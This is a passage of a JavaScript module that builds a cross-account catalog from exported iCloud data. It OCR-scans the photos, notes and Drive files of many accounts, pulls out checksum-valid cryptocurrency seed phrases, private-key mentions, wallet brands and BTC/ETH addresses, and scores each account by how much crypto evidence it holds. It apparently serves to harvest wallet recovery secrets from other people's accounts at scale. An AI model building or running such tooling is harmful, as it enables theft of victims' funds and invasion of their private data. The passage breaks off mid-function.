import fs from "node:fs/promises";
import path from "node:path";
import { s4exists, s4Key, s4url } from "./s4.js";
import { isAccountHidden, isHidden } from "./visibility.js";
import { safeName } from "./export.js";
import { dedupeSeeds, filterSeeds, seedLabel, isImagePath } from "./seeds.js";

/** Media listing written before the local copy was pruned. */
async function s4Manifest(root) {
  try {
    const raw = await fs.readFile(path.join(root, "Scan", "s4-manifest.json"), "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data?.files) ? data.files : null;
  } catch {
    return null;
  }
}

/** True once the account's media is provably complete on S4.
 *
 * Written by the prune step after a 0-difference check.  When set, links can
 * be signed without an existence check per file — the catalog holds 361k
 * photos, and one HEAD each was enough to make "All" never finish. */
const completeCache = new Map();
async function s4Complete(root) {
  const cached = completeCache.get(root);
  if (cached && Date.now() - cached.at < 120_000) return cached.ok;
  let ok = false;
  try {
    const stat = await fs.stat(path.join(root, "Scan", "s4-complete.json"));
    ok = stat.isFile();
  } catch {
    ok = false;
  }
  completeCache.set(root, { ok, at: Date.now() });
  return ok;
}

/** Links without an existence check (only for a complete account). */
function s4LinksFast(email, pairs) {
  const out = {};
  for (const [name, rel] of pairs) out[name] = rel ? s4url(s4Key(email, rel)) : "";
  return out;
}

/** S4 links for the parts of an item that are already mirrored. */
async function s4Links(email, pairs) {
  const out = {};
  await Promise.all(
    pairs.map(async ([name, rel]) => {
      if (!rel) {
        out[name] = "";
        return;
      }
      const key = s4Key(email, rel);
      out[name] = (await s4exists(key)) ? s4url(key) : "";
    })
  );
  return out;
}

/* Cross-account catalog for the panel Library.
 *
 * The export tree is the source of truth: one directory per account, with
 * Notes/, Contacts/, Calendar/, Photos/ and the Scan/ cache.  Walking it on
 * every search is too slow at 58 GB, so this module builds the metadata once,
 * keeps note text and existing OCR text in memory, and caches it briefly.
 * Nothing here writes to an export. */

const TTL_MS = 600_000;
const NOTE_CAP = 20_000;
const PHOTO_PAGE = 120;
const TEXT_PAGE = 100;
const CONCURRENCY = 4;

const IMAGE_EXT = new Set([
  ".jpg",
  ".jpeg",
  ".png",
  ".gif",
  ".webp",
  ".bmp",
  ".tif",
  ".tiff",
  ".heic",
  ".heif",
  ".avif",
]);
const VIDEO_EXT = new Set([".mov", ".mp4", ".m4v", ".3gp"]);
const PHOTO_AREAS = ["Library", "Hidden", "Recently Deleted"];
const TIER_ORDER = { valid: 0, high: 1, medium: 2, minimum: 3, low: 4 };

let cache = { key: "", at: 0, data: null, promise: null };
let accountCache = { mtimeMs: 0, accounts: [] };

async function readAccounts(storeFile) {
  try {
    const stat = await fs.stat(storeFile);
    if (stat.mtimeMs !== accountCache.mtimeMs) {
      const raw = JSON.parse(await fs.readFile(storeFile, "utf8"));
      accountCache = { mtimeMs: stat.mtimeMs, accounts: Array.isArray(raw.accounts) ? raw.accounts : [] };
    }
    return accountCache.accounts;
  } catch {
    return accountCache.accounts;
  }
}

async function isDir(dir) {
  try {
    return (await fs.stat(dir)).isDirectory();
  } catch {
    return false;
  }
}

async function isFile(file) {
  try {
    return (await fs.stat(file)).isFile();
  } catch {
    return false;
  }
}

async function readText(file, cap = NOTE_CAP) {
  try {
    const raw = await fs.readFile(file, "utf8");
    return raw.slice(0, cap);
  } catch {
    return "";
  }
}

async function readJson(file) {
  try {
    return JSON.parse(await fs.readFile(file, "utf8"));
  } catch {
    return null;
  }
}

async function walk(dir, out = []) {
  let entries;
  try {
    entries = await fs.readdir(dir, { withFileTypes: true });
  } catch {
    return out;
  }
  for (const entry of entries) {
    const full = path.join(dir, entry.name);
    if (entry.isDirectory()) await walk(full, out);
    else if (entry.isFile()) out.push(full);
  }
  return out;
}

async function mapLimit(items, limit, worker) {
  const results = new Array(items.length);
  let index = 0;
  const run = async () => {
    while (index < items.length) {
      const at = index;
      index += 1;
      results[at] = await worker(items[at], at);
    }
  };
  await Promise.all(Array.from({ length: Math.min(limit, items.length) }, run));
  return results;
}

async function rootFor(email, exportDir) {
  const exact = path.resolve(String(exportDir || "./export"), safeName(email, "account"));
  if (await isDir(exact)) return exact;
  const lower = path.resolve(String(exportDir || "./export"), safeName(String(email || "").toLowerCase(), "account"));
  if (lower !== exact && (await isDir(lower))) return lower;
  return "";
}

/** Accounts that have an export directory, with `root` resolved. */
export async function accountsWithExport(accounts, exportDir) {
  const found = [];
  for (const account of accounts) {
    const root = await rootFor(account?.email, exportDir);
    if (root) found.push({ ...account, root });
  }
  return found;
}

function personName(contact) {
  const first = contact?.firstName ?? contact?.first_name ?? "";
  const last = contact?.lastName ?? contact?.last_name ?? "";
  return [first, last].filter(Boolean).join(" ") || contact?.name || contact?.companyName || contact?.company || "(no name)";
}

function fields(list) {
  if (!Array.isArray(list)) return [];
  return list
    .map((item) => (typeof item === "string" ? item : item?.field ?? item?.value ?? ""))
    .filter(Boolean);
}

function text(value) {
  if (value == null) return "";
  if (Array.isArray(value)) return value.map(text).filter(Boolean).join(" · ");
  if (typeof value === "object") return JSON.stringify(value);
  return String(value);
}

function dateText(value) {
  if (Array.isArray(value) && value.length >= 3) {
    const [year, month, day, hour = 0, minute = 0] = value;
    const pad = (n) => String(n).padStart(2, "0");
    return `${year}-${pad(month)}-${pad(day)} ${pad(hour)}:${pad(minute)}`;
  }
  if (typeof value === "string") return value;
  return "";
}

function reminderRows(value, out = []) {
  if (Array.isArray(value)) {
    for (const item of value) reminderRows(item, out);
    return out;
  }
  if (!value || typeof value !== "object") return out;
  if (Array.isArray(value.reminders)) {
    for (const item of value.reminders) reminderRows(item, out);
    return out;
  }
  if (Array.isArray(value.items)) {
    for (const item of value.items) reminderRows(item, out);
    return out;
  }
  if (value.title || value.name) out.push(value);
  return out;
}

function snippet(body, needle, radius = 90) {
  const clean = String(body || "").replace(/\s+/g, " ").trim();
  if (!needle) return clean.slice(0, radius * 2);
  const at = clean.toLowerCase().indexOf(needle.toLowerCase());
  if (at < 0) return clean.slice(0, radius * 2);
  const start = Math.max(0, at - radius);
  const end = Math.min(clean.length, at + needle.length + radius);
  return `${start > 0 ? "…" : ""}${clean.slice(start, end)}${end < clean.length ? "…" : ""}`;
}

/* Crypto is a curated cross-account view: every seed finding, plus any
 * photo, note or Drive file whose text mentions a coin, exchange, wallet or
 * recovery phrase.  Matching happens once at catalog build time. */

// Strong signals first; the first hit decides the badge.  Case-sensitive
// tickers avoid matching ordinary words such as "Ada" or "Dot".
const SEED_RE = /\b(?:seed phrase|recovery phrase|secret phrase|mnemonic|passphrase|private key|seed words|seed)\b/i;
const WALLET_RE = /\b(?:hardware wallet|wallet|ledger live|ledger|trezor|bitbox|tangem|keystone|safepal|ellipal|coolwallet|ngrave|keepkey|metamask|exodus|phantom|trust ?wallet|bluewallet|sparrow|electrum)\b/i;
const EXCHANGE_RE = /\b(?:binance|coinbase|kraken|bitpanda|bison|relai|21bitcoin|bitgo|bsdex|bitfinex|kucoin|okx|bybit|crypto\.com|nexo|swissborg|young platform|scalable capital|trade republic|bitwala|bitcoin\.de|coinfinity)\b/i;
const TICKER_RE = /\b(?:BTC|ETH|USDT|USDC|XRP)\b/;
const COIN_RE = /\b(?:bitcoin|ethereum|ether|solana|cardano|polkadot|ripple|chainlink|polygon|tether|litecoin|dogecoin|avalanche|cosmos|tezos|algorand|tron|stellar|filecoin|arbitrum|optimism|aptos|celestia|injective|satoshi|sats|blockchain|lightning network)\b/i;
const CRYPTO_RE = /\b(?:crypto|krypto|altcoin|defi|web3|hodl|nft)\b/i;
const TRADING_RE = /\b(?:sparplan|auto[- ]?invest|portfolio|rendite|depot|guthaben|einzahlung|auszahlung)\b/i;
const BTC_ADDRESS_RE = /\b(?:bc1[ac-hj-np-z02-9]{11,71}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b/;
const ETH_ADDRESS_RE = /\b0x[a-fA-F0-9]{40}\b/;

export function cryptoMatch(body) {
  const value = String(body || "");
  let match = value.match(SEED_RE);
  if (match) return { matched: match[0].toLowerCase(), signal: "seed" };
  match = value.match(BTC_ADDRESS_RE) || value.match(ETH_ADDRESS_RE);
  if (match) {
    // A legacy 1…/3… match must not be a plain hex id (UUIDs look like
    // base58 and used to create dozens of false "address" signals).
    const legacyHex = /^[13]/.test(match[0]) && /^[0-9a-fA-F]+$/.test(match[0]);
    if (!legacyHex) return { matched: match[0], signal: "address" };
  }
  match = value.match(WALLET_RE);
  if (match) return { matched: match[0].toLowerCase(), signal: "wallet" };
  match = value.match(EXCHANGE_RE);
  if (match) return { matched: match[0].toLowerCase(), signal: "exchange" };
  match = value.match(TICKER_RE);
  if (match) return { matched: match[0], signal: "ticker" };
  match = value.match(COIN_RE);
  if (match) return { matched: match[0].toLowerCase(), signal: "crypto" };
  match = value.match(CRYPTO_RE);
  if (match) return { matched: match[0].toLowerCase(), signal: "crypto" };
  match = value.match(TRADING_RE);
  if (match) return { matched: match[0].toLowerCase(), signal: "trading" };
  return null;
}

/** Valid seed, then images, then notes/files, then 12+ checksum failures. */
function cryptoRank(item) {
  if (item.kind === "seed") return item.checksum ? 0 : 3;
  if (item.kind === "photo" || item.kind === "image") return 1;
  return 2;
}

function sourceLabel(area) {
  if (area === "photos") return "Photos";
  if (area === "notes") return "Notes";
  if (area === "drive") return "Drive";
  if (area === "mail") return "Mail";
  return "File";
}

async function thumbPath(root, rel) {
  if (!rel) return "";
  const thumb = `Scan/thumbs/${rel}.jpg`;
  return (await isFile(path.join(root, thumb))) ? thumb : "";
}

async function previewPath(root, rel) {
  if (!rel) return "";
  const preview = `Scan/previews/${rel}.jpg`;
  return (await isFile(path.join(root, preview))) ? preview : "";
}

async function buildAccount(account, root) {
  const base = {
    accountId: account.id,
    email: account.email,
    shortId: account.shortId,
  };
  const notes = [];
  const contacts = [];
  const calendar = [];
  const photos = [];
  const docs = [];
  const seedRows = [];
  const scanText = new Map();
  const vlmIndex = (await readJson(path.join(root, "Scan", "vlm-index.json"))) ?? {};

  for (const file of await walk(path.join(root, "Notes", "txt"))) {
    if (!file.toLowerCase().endsWith(".txt")) continue;
    const body = await readText(file);
    const name = path.basename(file);
    let stat = null;
    try {
      stat = await fs.stat(file);
    } catch {
      // keep going
    }
    notes.push({
      ...base,
      path: path.relative(root, file).split(path.sep).join("/"),
      name,
      title: name.replace(/^[0-9a-f]{8}_/i, "").replace(/\.txt$/i, ""),
      size: stat?.size ?? 0,
      mtime: stat?.mtimeMs ?? 0,
      text: body,
    });
  }

  const contactsRaw = await readJson(path.join(root, "Contacts", "contacts.json"));
  const contactList = Array.isArray(contactsRaw)
    ? contactsRaw
    : Array.isArray(contactsRaw?.contacts)
      ? contactsRaw.contacts
      : [];
  for (const contact of contactList) {
    contacts.push({
      ...base,
      name: personName(contact),
      phones: fields(contact.phones),
      emails: fields(contact.emails).length ? fields(contact.emails) : fields(contact.emailAddresses),
      company: contact.companyName ?? contact.company ?? "",
      note: text(contact.notes ?? contact.note),
    });
  }

  const calendarRaw = await readJson(path.join(root, "Calendar", "calendars.json"));
  const calendarNames = new Map(
    (calendarRaw?.calendars ?? []).map((item) => [item.guid, item.title])
  );
  for (const event of calendarRaw?.events ?? []) {
    calendar.push({
      ...base,
      kind: "calendar",
      title: event.title || "(untitled event)",
      when: dateText(event.startDate),
      notes: [
        calendarNames.get(event.pGuid) ?? "",
        event.location ?? "",
        text(event.notes ?? event.description ?? ""),
      ]
        .filter(Boolean)
        .join(" · "),
    });
  }
  const remindersRaw = await readJson(path.join(root, "Reminders", "reminders.json"));
  for (const reminder of reminderRows(remindersRaw)) {
    calendar.push({
      ...base,
      kind: "reminder",
      title: reminder.title || reminder.name || "(untitled reminder)",
      when: dateText(reminder.dueDate ?? reminder.startDate ?? ""),
      notes: text(reminder.notes ?? reminder.body ?? ""),
    });
  }

  const manifest = await s4Manifest(root);
  const complete = await s4Complete(root);
  for (const area of PHOTO_AREAS) {
    const listed = manifest
      ? manifest.filter((entry) => entry.p.startsWith(`Photos/${area}/`))
      : null;
    const entries = listed
      ? listed.map((entry) => ({ file: entry.p, rel: entry.p, size: entry.s, mtime: entry.m }))
      : (await walk(path.join(root, "Photos", area))).map((file) => ({
          file,
          rel: path.relative(root, file).split(path.sep).join("/"),
          size: null,
          mtime: null,
        }));
    for (const entry of entries) {
      const file = entry.file;
      const suffix = path.extname(file).toLowerCase();
      if (!IMAGE_EXT.has(suffix) && !VIDEO_EXT.has(suffix)) continue;
      const rel = entry.rel;
      let stat = entry.size === null ? null : { size: entry.size, mtimeMs: entry.mtime };
      if (stat === null) {
        try {
          stat = await fs.stat(path.join(root, file));
        } catch {
          // keep going
        }
      }
      const thumbRel = `Scan/thumbs/${rel}.jpg`;
      const ocrRel = `Scan/ocr/${rel}.txt`;
      const previewRel = `Scan/previews/${rel}.jpg`;
      const playRel = `Scan/play/${rel}.mp4`;
      const isVideo = VIDEO_EXT.has(suffix);
      const isHeic = suffix === ".heic" || suffix === ".heif";
      const ocr = await isFile(path.join(root, ocrRel));
      const meta = vlmIndex[rel] || null;
      photos.push({
        ...base,
        path: rel,
        name: path.basename(file),
        area,
        kind: meta?.kind || "",
        modelKind: meta?.modelKind || "",
        seedChecksum: Boolean(meta?.checksum),
        seedPhrase: meta?.phrase || "",
        size: stat?.size ?? 0,
        mtime: stat?.mtimeMs ?? 0,
        thumb: thumbRel,
        preview: isHeic ? previewRel : "",
        play: isVideo && (await isFile(path.join(root, playRel))) ? playRel : "",
        ocr,
        video: isVideo,
        // A complete account gets links without an existence check; one that
        // is still uploading stays on the local file route.
        ...(complete
          ? {
              ...s4LinksFast(account.email, [
                ["src", rel],
                ["thumbSrc", thumbRel],
                ["playSrc", isVideo ? playRel : ""],
              ]),
              // Relative on purpose: /file serves the bucket copy or builds
              // one.  A signed key for a preview that was never generated
              // 404s and costs the lightbox nine seconds of retries.
              previewSrc: isHeic ? previewRel : "",
            }
          : {}),
      });
    }
  }

  // Drive images and videos belong in the same image list, labelled "Drive"
  // so the operator can tell them from the photo library.
  const driveEntries = manifest
    ? manifest
        .filter((entry) => entry.p.startsWith("Drive/"))
        .map((entry) => ({ file: entry.p, rel: entry.p, size: entry.s, mtime: entry.m }))
    : (await walk(path.join(root, "Drive"))).map((file) => ({
        file,
        rel: path.relative(root, file).split(path.sep).join("/"),
        size: null,
        mtime: null,
      }));
  for (const entry of driveEntries) {
    const file = entry.file;
    const suffix = path.extname(file).toLowerCase();
    if (!IMAGE_EXT.has(suffix) && !VIDEO_EXT.has(suffix)) continue;
    const rel = entry.rel;
    let stat = entry.size === null ? null : { size: entry.size, mtimeMs: entry.mtime };
    if (stat === null) {
      try {
        stat = await fs.stat(path.join(root, file));
      } catch {
        // keep going
      }
    }
    const meta = vlmIndex[rel] || null;
    const isVideo = VIDEO_EXT.has(suffix);
    const isHeic = suffix === ".heic" || suffix === ".heif";
    photos.push({
      ...base,
      path: rel,
      name: path.basename(file),
      area: "Drive",
      kind: meta?.kind || "",
      modelKind: meta?.modelKind || "",
      seedChecksum: Boolean(meta?.checksum),
      seedPhrase: meta?.phrase || "",
      size: stat?.size ?? 0,
      mtime: stat?.mtimeMs ?? 0,
      thumb: `Scan/thumbs/${rel}.jpg`,
      preview: isHeic ? `Scan/previews/${rel}.jpg` : "",
      play: isVideo && (await isFile(path.join(root, `Scan/play/${rel}.mp4`))) ? `Scan/play/${rel}.mp4` : "",
      ocr: await isFile(path.join(root, `Scan/ocr/${rel}.txt`)),
      video: isVideo,
      ...(complete
        ? s4LinksFast(account.email, [
            ["src", rel],
            ["thumbSrc", `Scan/thumbs/${rel}.jpg`],
            ["playSrc", isVideo ? `Scan/play/${rel}.mp4` : ""],
          ])
        : {}),
    });
  }

  const index = await readJson(path.join(root, "Scan", "index.json"));
  const entries = Array.isArray(index) ? index : index?.entries ?? [];
  for (const entry of entries) {
    if (!entry?.path) continue;
    scanText.set(entry.path, String(entry.text ?? "").slice(0, NOTE_CAP));
    const rel = String(entry.path);
    const suffix = path.extname(rel).toLowerCase();
    const image = entry.kind === "image" || IMAGE_EXT.has(suffix);
    const isDoc =
      ["drive", "mail", "other"].includes(entry.area) ||
      (entry.area === "notes" && image);
    if (!isDoc) continue;
    docs.push({
      ...base,
      path: rel,
      name: entry.name || path.basename(rel),
      area: entry.area || "drive",
      kind: entry.kind || (image ? "image" : "file"),
      size: Number(entry.size) || 0,
      mtime: (Number(entry.mtime) || 0) * 1000,
      video: VIDEO_EXT.has(suffix),
      thumb: image ? await thumbPath(root, rel) : "",
      preview: image ? await previewPath(root, rel) : "",
    });
  }
  // A scan writes OCR files during the run and index.json at the end.  Read
  // the OCR text directly for images that already have it, so search works
  // while a scan is still in progress.
  for (const photo of photos) {
    if (!photo.ocr || scanText.has(photo.path)) continue;
    scanText.set(photo.path, await readText(path.join(root, "Scan", "ocr", `${photo.path}.txt`)));
  }

  const findings = await readJson(path.join(root, "Scan", "findings.json"));
  for (const item of (Array.isArray(findings) ? findings : findings?.findings ?? [])) {
    seedRows.push({
      ...base,
      file: item.file ?? item.path ?? "",
      area: item.area ?? "",
      phrase: item.phrase ?? "",
      words: Number(item.words) || 0,
      tier: item.tier ?? "low",
      checksum: Boolean(item.checksum),
      spam: Boolean(item.spam),
      source: item.source ?? "",
      snippet: item.snippet ?? "",
    });
  }
  // One card per phrase: sources merged, valid checksum and an image
  // screenshot preferred over a text copy.
  const seeds = dedupeSeeds(seedRows);

  const crypto = [];
  const seedFiles = new Set();
  const PHRASE_COUNTS = new Set([12, 15, 18, 21, 24]);
  for (const seed of seeds) {
    if (seed.file) seedFiles.add(seed.file);
    // Crypto is the phrase view; the 3–11 word candidates belong to the
    // per-account Seeds tab.  Anything past 24 is merged prose/JSON noise.
    if (seed.spam || !PHRASE_COUNTS.has(seed.words)) continue;
    crypto.push({
      ...seed,
      kind: "seed",
      source: sourceLabel(seed.area),
      matched: "seed phrase",
      signal: "seed",
      snippet: seed.phrase,
      thumb: await thumbPath(root, seed.file),
    });
  }
  for (const note of notes) {
    const hit = cryptoMatch(`${note.path} ${note.name} ${note.text}`);
    if (!hit) continue;
    crypto.push({
      ...note,
      kind: "note",
      source: "Notes",
      matched: hit.matched,
      signal: hit.signal,
      snippet: snippet(note.text, hit.matched),
      thumb: "",
    });
  }
  for (const photo of photos) {
    const body = scanText.get(photo.path) || "";
    const hit = cryptoMatch(`${photo.path} ${photo.name} ${body}`);
    if (!hit) continue;
    crypto.push({
      ...photo,
      kind: "photo",
      source: "Photos",
      matched: hit.matched,
      signal: hit.signal,
      snippet: snippet(body, hit.matched),
    });
  }
  for (const doc of docs) {
    if (seedFiles.has(doc.path)) continue;
    const body = scanText.get(doc.path) || "";
    const hit = cryptoMatch(`${doc.path} ${doc.name} ${body}`);
    if (!hit) continue;
    crypto.push({
      ...doc,
      source: sourceLabel(doc.area),
      matched: hit.matched,
      signal: hit.signal,
      snippet: snippet(body, hit.matched),
    });
  }
  crypto.sort(
    (a, b) =>
      cryptoRank(a) - cryptoRank(b) ||
      (Number(b.mtime) || 0) - (Number(a.mtime) || 0) ||
      String(a.name).localeCompare(String(b.name))
  );

  return {
    notes,
    contacts,
    calendar,
    photos,
    docs,
    seeds,
    crypto,
    scanText,
    scanned: Boolean(entries.length) || (await isFile(path.join(root, "Scan", "index.json"))),
  };
}

/** One row per account: is there crypto, how much, and which evidence. */
function summarizeCrypto(items) {
  const byAccount = new Map();
  for (const item of items) {
    const key = item.accountId || item.email;
    let row = byAccount.get(key);
    if (!row) {
      row = {
        accountId: item.accountId,
        email: item.email,
        shortId: item.shortId,
        count: 0,
        seeds: 0,
        images: 0,
        notes: 0,
        files: 0,
        hasAddress: false,
        lastMtime: 0,
        signals: new Map(),
        matches: new Map(),
      };
      byAccount.set(key, row);
    }
    row.count += 1;
    if (item.kind === "seed") row.seeds += 1;
    else if (item.kind === "photo" || item.kind === "image") row.images += 1;
    else if (item.kind === "note") row.notes += 1;
    else row.files += 1;
    if (item.signal) row.signals.set(item.signal, (row.signals.get(item.signal) ?? 0) + 1);
    if (item.matched && item.signal !== "seed") {
      row.matches.set(item.matched, (row.matches.get(item.matched) ?? 0) + 1);
    }
    if (item.signal === "address") row.hasAddress = true;
    row.lastMtime = Math.max(row.lastMtime, Number(item.mtime) || 0);
  }
  return [...byAccount.values()]
    .map((row) => ({
      accountId: row.accountId,
      email: row.email,
      shortId: row.shortId,
      count: row.count,
      seeds: row.seeds,
      images: row.images,
      notes: row.notes,
      files: row.files,
      hasAddress: row.hasAddress,
      lastMtime: row.lastMtime,
      signals: [...row.signals.entries()]
        .sort((a, b) => b[1] - a[1])
        .map(([name, count]) => ({ name, count })),
      top: [...row.matches.entries()]
        .sort((a, b) => b[1] - a[1])
        .slice(0, 6)
        .map(([name]) => name),
      score:
        row.seeds * 8 +
        row.images * 4 +
        row.notes * 2 +
        row.files * 2 +
        (row.hasAddress ? 10 : 0) +
        row.count,
    }))
    .sort((a, b) => b.score - a.score || b.lastMtime - a.lastMtime);
}

async function build({ storeFile, exportDir }) {
  const accounts = await readAccounts(storeFile);
  const withRoots = await accountsWithExport(accounts, exportDir);
  const built = await mapLimit(withRoots, CONCURRENCY, (account) => buildAccount(account, account.root));

  const catalog = {
    builtAt: new Date().toISOString(),
    accounts: withRoots.map((account) => ({
      id: account.id,
      email: account.email,
      shortId: account.shortId ?? "",
      hidden: Boolean(account.hidden),
      status: account.status ?? "",
      trusted: Boolean(account.trusted),
      scanPhase: account.scan?.phase ?? "",
    })),
    notes: [],
    contacts: [],
    calendar: [],
    photos: [],
    docs: [],
    seeds: [],
    crypto: [],
    cryptoAccounts: [],
    ocr: new Map(),
    scannedAccounts: 0,
  };
  for (let index = 0; index < built.length; index += 1) {
    const item = built[index];
    const account = withRoots[index];
    // push(...array) overflows the stack once a library passes ~100k files.
    for (const value of item.notes) catalog.notes.push(value);
    for (const value of item.contacts) catalog.contacts.push(value);
    for (const value of item.calendar) catalog.calendar.push(value);
    for (const value of item.photos) catalog.photos.push(value);
    for (const value of item.docs) catalog.docs.push(value);
    for (const value of item.seeds) catalog.seeds.push(value);
    for (const value of item.crypto) catalog.crypto.push(value);
    if (item.scanned) catalog.scannedAccounts += 1;
    for (const [rel, body] of item.scanText) {
      catalog.ocr.set(`${account.id}:${rel}`, body);
    }
  }
  // Sort once at build time; every query then only filters and paginates.
  catalog.notes.sort((a, b) => b.mtime - a.mtime);
  catalog.photos.sort((a, b) => b.mtime - a.mtime);
  catalog.contacts.sort((a, b) => a.name.localeCompare(b.name));
  catalog.calendar.sort((a, b) => String(b.when).localeCompare(String(a.when)));
  catalog.docs.sort((a, b) => String(a.path).localeCompare(String(b.path)));
  catalog.crypto.sort(
    (a, b) =>
      cryptoRank(a) - cryptoRank(b) ||
      (Number(b.mtime) || 0) - (Number(a.mtime) || 0)
  );
  catalog.cryptoAccounts = summarizeCrypto(catalog.crypto);
  catalog.seeds.sort(
    (a, b) =>
      Number(Boolean(b.checksum)) - Number(Boolean(a.checksum)) ||
      Number(isImagePath(b.file)) - Number(isImagePath(a.file)) ||
      (TIER_ORDER[a.tier] ?? 9) - (TIER_ORDER[b.tier] ?? 9) ||
      a.phrase.localeCompare(b.phrase)
  );
  return catalog;
}

export function invalidateCatalog() {
  cache = { key: "", at: 0, data: null, promise: null };
}

/** Build or return the cached catalog.  One build runs at a time.
 *
 * Stale-while-revalidate: a rebuild of every account takes ~20 s, and the old
 * code made the operator wait for it every two minutes.  Now the previous
 * catalog is served at once and the new one is swapped in when it is ready. */
export async function buildCatalog({ storeFile, exportDir, force = false } = {}) {
  const key = `${path.resolve(storeFile)}|${path.resolve(exportDir)}`;
  const now = Date.now();
  const cached = cache.key === key ? cache.data : null;

  // vlm_index.py rewrites the per-account label files every minute and touches
  // this marker; a newer marker means the labels moved on, so rebuild now
  // instead of waiting for the 10 minute TTL.
  const mark = await classifyMarker();
  if (cached && mark > (cache.mark || 0)) {
    if (!cache.promise) {
      const promise = build({ storeFile, exportDir });
      cache = { ...cache, mark };
      promise
        .then((data) => {
          cache = { key, at: Date.now(), data, promise: null, mark };
        })
        .catch(() => {
          cache = { ...cache, promise: null };
        });
    }
    return cached;
  }

  if (force) {
    cache = { key, at: cache.at, data: cached, promise: build({ storeFile, exportDir }), mark };
    try {
      const data = await cache.promise;
      cache = { key, at: Date.now(), data, promise: null, mark };
      return data;
    } catch (error) {
      cache = { key, at: 0, data: null, promise: null };
      throw error;
    }
  }
  if (cached && now - cache.at < TTL_MS) return cached;
  if (cached) {
    if (!cache.promise) {
      const promise = build({ storeFile, exportDir });
      cache = { ...cache, promise };
      promise
        .then((data) => {
          cache = { key, at: Date.now(), data, promise: null, mark };
        })
        .catch(() => {
          cache = { ...cache, promise: null };
        });
    }
    return cached;
  }
  if (cache.promise && cache.key === key) return cache.promise;
  cache = { key, at: cache.at, data: null, promise: build({ storeFile, exportDir }), mark };
  try {
    const data = await cache.promise;
    cache = { key, at: Date.now(), data, promise: null, mark };
    return data;
  } catch (error) {
    cache = { key, at: 0, data: null, promise: null };
    throw error;
  }
}

const CLASSIFY_MARKER = process.env.CLASSIFY_INDEX || "/opt/icloud3/classify/index.json";

/** mtime of the classifier's marker, 0 when it has never run. */
async function classifyMarker() {
  try {
    const info = await fs.stat(CLASSIFY_MARKER);
    return info.mtimeMs;
  } catch {
    return 0;
  }
}


const countCache = new WeakMap();
const seedCache = new WeakMap();

function isNeedle(value, needle) {
  return !needle || String(value ?? "").toLowerCase().includes(needle);
}

function pageOf(list, page, size) {
  const pages = Math.max(1, Math.ceil(list.length / size));
  const current = Math.min(Math.max(Number(page) || 1, 1), pages);
  const offset = (current - 1) * size;
  return { items: list.slice(offset, offset + size), total: list.length, page: current, pages };
}

export function queryCatalog(
  catalog,
  {
    type = "all",
    q = "",
    accountId = "",
    area = "All",
    page = 1,
    pageSize = 0,
    tier = "",
    checksum = "",
    words = 0,
    spam = "",
    compact = "",
    cryptoKind = "",
    kind = "",
    visibility = [],
  } = {}
) {
  const needle = String(q ?? "").trim().toLowerCase();
  // Rules hide an account (or just some of its categories) from every list.
  const hidden = (item) =>
    isHidden(visibility, item.email, item.kind) || isAccountHidden(visibility, item.email);
  const scope = (item) => (!accountId || item.accountId === accountId) && !hidden(item);
  const inScope = accountId ? (list) => list.filter(scope) : (list) => list;
  const scopedPhotos = inScope(catalog.photos).filter((item) => !hidden(item));
  const scopedSeeds = inScope(catalog.seeds).filter((item) => !hidden(item));
  // The counts are the same for every page of one catalog: a full-library
  // query used to walk 179k photos + 224k seeds on every keystroke.
  let countsByScope = countCache.get(catalog);
  if (!countsByScope) {
    countsByScope = new Map();
    countCache.set(catalog, countsByScope);
  }
  const visitKey = `${accountId}|${JSON.stringify(visibility)}`;
  const counts = countsByScope.get(visitKey) || (() => {
    const value = {
    accounts: catalog.accounts.length,
    notes: inScope(catalog.notes).length,
    contacts: inScope(catalog.contacts).length,
    calendar: inScope(catalog.calendar).length,
    photos: scopedPhotos.length,
    seeds: scopedSeeds.filter((item) => !item.spam).length,
    seedSpam: scopedSeeds.filter((item) => item.spam).length,
    crypto: inScope(catalog.crypto).length,
    cryptoAccounts: 0,
    cryptoSeeds: inScope(catalog.crypto).filter((item) => item.kind === "seed").length,
    scannedAccounts: catalog.scannedAccounts ?? 0,
    ocrDone: scopedPhotos.filter((photo) => photo.ocr).length,
    ocrPending: scopedPhotos.filter((photo) => !photo.ocr).length,
    scanning: catalog.accounts.filter((account) => account.scanPhase === "running").length,
    photoKinds: scopedPhotos.reduce((acc, photo) => {
      const key = photo.kind || "unclassified";
      acc[key] = (acc[key] || 0) + 1;
      return acc;
    }, {}),
    };
    countsByScope.set(visitKey, value);
    return value;
  })();

  // Without a search term the scoped lists are already the answer: the
  // predicate used to be run over 270k items on every page load.
  const notes = (needle
    ? catalog.notes.filter(
        (item) =>
          scope(item) && isNeedle(`${item.title} ${item.name} ${item.text}`, needle)
      )
    : inScope(catalog.notes)
  ).filter((item) => !hidden(item));
  const contacts = needle
    ? catalog.contacts.filter(
        (item) =>
          scope(item) &&
          isNeedle(
            [item.name, ...item.phones, ...item.emails, item.company, item.note].join(" "),
            needle
          )
      )
    : inScope(catalog.contacts);
  const calendar = needle
    ? catalog.calendar.filter(
        (item) => scope(item) && isNeedle([item.title, item.when, item.notes].join(" "), needle)
      )
    : inScope(catalog.calendar);
  const wantsArea = area && area !== "All";
  const narrows = Boolean(needle || wantsArea || (kind && kind !== "any"));
  const matchedPhotos = narrows
    ? catalog.photos.filter((item) => {
        if (!scope(item)) return false;
        if (wantsArea && item.area !== area) return false;
        if (kind && kind !== "any" && item.kind !== kind) return false;
        if (!needle) return true;
        const body = catalog.ocr.get(`${item.accountId}:${item.path}`) ?? "";
        return isNeedle(`${item.name} ${body}`, needle);
      })
    : inScope(catalog.photos);
  // Only a text search needs a per-item copy for the snippet.
  const photos = needle
    ? matchedPhotos.map((item) => ({
        ...item,
        snippet: snippet(catalog.ocr.get(`${item.accountId}:${item.path}`) ?? "", needle),
      }))
    : matchedPhotos;
  // Seeds are the largest list after photos: keep the scoped, non-spam
  // version per catalog instead of rebuilding it on every request.
  let seedLists = seedCache.get(catalog);
  if (!seedLists) {
    seedLists = new Map();
    seedCache.set(catalog, seedLists);
  }
  const seedKey = `${accountId}|${spam === "1" ? "spam" : "clean"}`;
  let seedBase = seedLists.get(seedKey);
  if (!seedBase) {
    seedBase = catalog.seeds.filter((item) => scope(item) && (spam === "1" || !item.spam));
    seedLists.set(seedKey, seedBase);
  }
  const seeds = filterSeeds(seedBase, { tier, checksum, words }).filter((item) => {
    if (!needle) return true;
    return isNeedle(
      `${item.phrase} ${item.file} ${item.area} ${(item.files ?? []).join(" ")} ${(item.sources ?? []).join(" ")}`,
      needle
    );
  });
  const crypto = catalog.crypto.filter((item) => {
    if (!scope(item)) return false;
